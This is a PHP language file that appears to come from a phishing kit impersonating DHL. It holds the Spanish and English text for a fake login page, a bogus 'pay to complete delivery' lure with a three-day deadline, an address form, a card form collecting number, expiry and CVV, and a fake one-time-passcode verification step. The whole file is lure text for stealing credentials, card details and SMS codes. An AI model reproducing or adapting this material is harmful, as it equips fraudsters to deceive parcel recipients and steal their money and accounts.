<?php
	$lg_d = [
		'head' => "ACTUALIZACIÓN DE COVID-19",
        'msg' => "Acceso",
		'lbl_eml' => "Dirección de correo electrónico",
		'navbar' => "Búsqueda",
		'lbl_pss' => "Contraseña",
		'sub' => "Acceso",
		'navbar2' => "Alertas",
		'footer' => "Configuración de cookies",
		'footer2' => "© DHL International GmbH. Reservados todos los derechos.",
		'remember' => "Recuérdame",
		'help' => "Síganos",
	];

	$intro_d = [
		'day' => "FECHA : ",
		'in' => "54246452-AV",
		'msg' => "Para completar la entrega lo antes posible,",
		'msg2' => "por favor confirme el pago",
		'msg3' => "y nuevo intento de entrega.",
		'msg4' => "Al hacer clic en siguiente, la confirmación en línea debe realizarse dentro de los próximos 3 días,",
        'msg5' => " antes de que caduque.. ",
        'ord' => "Pedido: ",
		'pm' => "MÉTODO DE PAGO:",
		'bt' => "PAGAR Y CONTINUAR",
	];
	
	
	$info_d = [
		'title' => "Actualizar dirección de entrega",
		'title2' => "Todos los campos marcados con un asterisco (*) son obligatorios.",
		'inp' => "su número de seguimiento",
		'ope' => "Datos de operación",
		'imp' => "Importado :",
		'ter' => "Terminal :",
		'ord' => "Pedido :",
		'fname' => "Nombre de pila*",
		'fname2' => "Por favor, introduzca su nombre de pila.",
		'lname' => "Apellido*",
		'lname2' => "Por favor ingrese su apellido.",
		'phone' => "Número de teléfono incluyendo código de país*",
		'phone2' => "Por favor introduzca su número de teléfono.",
		'country' => "país/región*",
		'country2' => "Por favor ingrese su país.",
		'adr' => "Dirección*",
		'adr2' => "Por favor ingrese su dirección.",
		'city' => "Ciudad*",
		'city2' => "Por favor ingrese su ciudad.",
		'state' => "Expresar*",
		'state2' => "Por favor ingrese su estado.",
		'zip' => "Código postal*",
		'zip2' => "Por favor ingrese su código postal.",
		'save' => "ahorrar",
	];
	
	
	
	$pay_d = [
		'title' => "Confirm the payment",
		'ope' => "Operation data",
		'imp' => "Imported :",
		'ter' => "Terminal :",
		'ord' => "Order :",
		'fullname' => "Name of card*",
		'fullname2' => "Please enter your name of card.",
		'cnm' => "Card Number*",
		'cnm2' => "Please enter your Card Number.",
		'exp' => "Expiration Date (MM/YY)*",
		'exp2' => "Please enter your Expiration Date.",
		'csc' => "Security Code (CVV)*",
		'csc2' => "Please enter your Security Code (CVV).",
		'save' => "SAVE",
	];
	
	

	$vbv_d = [
		'sec' => "Please enter your Security Code or OTP",
		'sec2' => "One-Time Passcode is required for this purchase.
this code has been sent to your registered mobile *******",
		'funa' => "Full Name :",
		'bnk' => "Bank :",
		'dat' => "Date :",
		'crd' => "Credit Card :",
		'amo' => "Amount :",
		'cos' => "Code Sent :",
		'otpc' => "OTP CODE :",
		'msger' => "This code is invalid. Check the SMS and try again.",
		'msger2' => "Check the SMS and try again.",
		'msgsf' => "The delivery charges have been paid successfully.",
		'submit' => "Submit"
	];

?>